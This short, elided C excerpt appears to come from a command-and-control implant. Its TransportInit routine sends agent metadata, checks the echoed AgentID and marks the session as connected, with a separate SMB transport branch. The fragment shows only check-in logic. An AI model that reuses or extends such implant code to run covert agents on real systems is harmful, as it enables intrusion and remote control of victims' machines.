...
BOOL TransportInit( )
{
    ...
    if ( PackageTransmitNow( ((INSTANCE *)Instance)->MetaData, &Data, &Size ) )
    {
        AESCTX AesCtx = { 0 };
        ...
        if ( Data )
        {
            if ( ( UINT32 ) ((INSTANCE *)Instance)->Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                ((INSTANCE *)Instance)->Session.Connected = TRUE;
                Success = TRUE;
            }
        }
    }
...
#ifdef TRANSPORT_SMB
    if ( PackageTransmitNow( ((INSTANCE *)Instance)->MetaData, NULL, NULL ) == TRUE )
    {
        ((INSTANCE *)Instance)->Session.Connected = TRUE;
        Success = TRUE;
    }
